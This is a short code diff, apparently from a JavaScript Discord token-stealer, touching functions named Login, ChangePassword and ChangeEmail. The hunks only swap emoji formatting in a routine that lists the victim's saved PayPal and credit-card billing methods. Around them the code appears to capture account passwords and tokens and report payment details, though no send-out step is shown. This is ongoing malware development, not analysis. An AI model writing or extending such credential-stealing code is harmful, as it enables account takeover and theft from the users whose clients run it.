@@ -812,7 +812,7 @@ async function Login(email, password, token) {
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "✔️" + " :credit_card:"
+                        billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
                         return ":x:"
                     }
@@ -974,17 +974,17 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`❌\`"
+                        return ":x:"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " :credit_card:"
+                        billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
-                        return "\`❌\`"
+                        return ":x:"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`❌\`"
+                    billing = ":x:"
                 }
                 return billing
             }
@@ -1134,17 +1134,17 @@ async function ChangeEmail(newemail, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`❌\`"
+                        return ":x:"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`✔️\`" + " :credit_card:"
+                        billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
-                        return "\`❌\`"
+                        return ":x:"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`❌\`"
+                    billing = ":x:"
                 }
                 return billing
             }
